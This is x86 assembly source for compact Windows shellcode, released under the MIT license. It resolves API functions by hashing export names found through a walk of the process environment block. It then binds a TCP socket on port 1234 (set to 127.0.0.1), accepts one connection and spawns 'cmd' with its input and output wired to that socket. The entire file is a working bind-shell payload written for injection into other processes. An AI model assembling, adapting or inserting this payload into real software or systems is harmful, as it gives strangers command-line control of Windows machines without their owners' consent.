 ;
 ;  The MIT License:
 ;
 ;  Copyright (c) 2004, 2008, 2013 Kevin Devine
 ;
 ;  Permission is hereby granted,  free of charge,  to any person obtaining a
 ;  copy of this software and associated documentation files (the "Software"),
 ;  to deal in the Software without restriction,  including without limitation
 ;  the rights to use,  copy,  modify,  merge,  publish,  distribute,
 ;  sublicense,  and/or sell copies of the Software,  and to permit persons to
 ;  whom the Software is furnished to do so,  subject to the following
 ;  conditions:
 ;
 ;  The above copyright notice and this permission notice shall be included in
 ;  all copies or substantial portions of the Software.
 ;
 ;  THE SOFTWARE IS PROVIDED "AS IS",  WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 ;  IMPLIED,  INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 ;  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 ;  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM,  DAMAGES OR OTHER
 ;  LIABILITY,  WHETHER IN AN ACTION OF CONTRACT,  TORT OR OTHERWISE,
 ;  ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR
 ;  OTHER DEALINGS IN THE SOFTWARE.
 ;
    .686
    .model flat, stdcall

    option casemap:none

    .nolist
    .nocref

    WIN32_LEAN_AND_MEAN equ 1

    include windows.inc
    include winsock.inc

    .list
    .cref

    LOCAL_IP    equ 00100007fh  ; 127.0.0.1
    LOCAL_PORT  equ 1234
    ROL_CONSTANT equ 7

    mrol macro iNum:req, iBits:req
      exitm <((iNum shl iBits) and 0FFFFFFFFh) or (iNum shr (32-iBits))>
    endm

    hashapi macro szApi
      local dwApi

      dwApi = 0

      forc x, szApi
        if '&x' ne '"'
          dwApi = mrol((dwApi + '&x'), ROL_CONSTANT) xor '&x'
        endif
      endm
      dwApi = mrol(dwApi, ROL_CONSTANT)
      ifdef USE_16
        dw (dwApi and 0FFFFh)
      else
        dd (dwApi and 0FFFFFFFFh)
      endif
    endm

    PUSHAD_STRUCT struc
      _edi  dd  ?
      _esi  dd  ?
      _ebp  dd  ?
      _esp  dd  ?
      _ebx  dd  ?
      _edx  dd  ?
      _ecx  dd  ?
      _eax  dd  ?
    PUSHAD_STRUCT ends

    .data
  wsa WSADATA <>

  includelib kernel32.lib
  includelib ws2_32.lib

  STACK_SIZE equ sizeof(PROCESS_INFORMATION) \
               + sizeof(STARTUPINFO)         \
               + sizeof(sockaddr_in)         \
               + 6*4
  .code

entrypoint:
ifdef TEST_CODE
    mov eax, code_end - code_start

    push offset wsa
    push MAKEWORD(2, 0)
    call WSAStartup

    call code_start

    push eax
    call ExitProcess
endif
code_start:
    jmp load_data
calc_position:
    pop esi                      ; esi has pointer to our hashes
                                 ; load relative address of our API retrieval routine
    lea ebp, [esi + (offset get_proc_address - offset data_section)]

    xor eax, eax                 ; eax = 0
    cdq                          ; edx = 0
    mov dl, STACK_SIZE

    sub esp, edx                 ; first, reserve stack space for api parameters
    mov edi, esp                 ; store stack pointer in edi so we can use stosd instruction
    mov ecx, edx                 ; set size of data to initialize
    rep stosb                    ; zero fill

    push SOCK_STREAM
    push AF_INET
    call ebp                     ; WSASocketA
    xchg eax, ebx                ; save socket

    push LOCAL_IP
    push ((LOCAL_PORT and 0FFh) shl 24) or \
        (((LOCAL_PORT and 0FF00h) shr 8) shl 16) + AF_INET
    mov eax, esp                 ; sockaddr_in

    push sizeof(sockaddr_in)
    push eax                     ; &sin
    push ebx                     ; s
    call ebp                     ; bind

    add esp, sizeof(sockaddr_in)+2*4 ; free stack space

    push 1                       ; accept 1 connection
    push ebx
    call ebp                     ; listen

    push ebx
    call ebp                     ; accept

    push ebx                     ; parameter to closesocket

    lea ebx, [edi - ( sizeof(PROCESS_INFORMATION) + sizeof(STARTUPINFO) )]
    lea edi, [ebx][STARTUPINFO.hStdInput]
    inc dword ptr[ebx][STARTUPINFO.dwFlags+1]

    stosd                        ; si.hStdInput
    stosd                        ; si.hStdOutput
    stosd                        ; si.hStdError

    cdq
    push edi                     ; &pi
    push ebx                     ; &si

    push edx
    push edx
    push edx
    push eax                     ; TRUE
    push edx                     ; 0
    push edx                     ; 0
    inc byte ptr[esi+3]
    push esi                     ; "cmd",0
    lodsd                        ; skip string
    push edx                     ; 0
    call ebp                     ; CreateProcessA

    push INFINITE                ; INFINITE
    push dword ptr[edi][PROCESS_INFORMATION.hProcess]
    call ebp                     ; WaitForSingleObject
    call ebp                     ; closesocket
    add esp, sizeof(PROCESS_INFORMATION) + sizeof(STARTUPINFO)  ; free stack space
    ret

load_data:
    call calc_position
; not really data section as we're in same segment
data_section label dword
    hashapi "WSASocketA"
    hashapi "bind"
    hashapi "listen"
    hashapi "accept"
    db      "c", "m", "d", 0FFh
    hashapi "CreateProcessA"
    hashapi "WaitForSingleObject"
    hashapi "closesocket"

get_proc_address proc near
    assume fs:nothing
ifdef USE_16
    lodsw
else
    lodsd
endif
    pushad
    push 30h
    pop esi
    lods dword ptr fs:[esi]
    mov eax, [eax+0Ch]
    mov esi, [eax+1Ch]
load_dll:
    mov ebp, [esi+08h]
    lodsd
    push eax

    mov eax, [ebp+3Ch]      ; IMAGE_DOS_HEADER.e_lfanew
    mov eax, [ebp+eax+78h]  ; IMAGE_NT_HEADERS.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    lea esi, [ebp+eax+18h]  ; IMAGE_EXPORT_DIRECTORY.NumberOfNames
    lodsd
    xchg eax, ecx
    jecxz load_dll

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfFunctions
    add eax, ebp
    push eax

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNames
    lea edi, [ebp+eax]

    lodsd                   ; IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals
    lea ebx, [ebp+eax]
load_api:
    mov esi, [edi+4*ecx-4]
    add esi, ebp
    xor eax, eax
    cdq
hash_api:
    lodsb
    add edx, eax
    rol edx, ROL_CONSTANT
    xor edx, eax
    dec eax
    jns hash_api

ifdef USE_16
    mov eax, dword ptr[esp+8][PUSHAD_STRUCT._eax]
    cmp dx, ax
else
    cmp edx, dword ptr[esp+8][PUSHAD_STRUCT._eax]
endif
    loopne load_api
    pop eax
    pop esi
    jne load_dll

    movzx edx, word ptr [ebx+2*ecx]
    add ebp, [eax+4*edx]
    mov [esp][PUSHAD_STRUCT._eax], ebp
    popad
    jmp eax
get_proc_address endp

code_end label dword

      end entrypoint
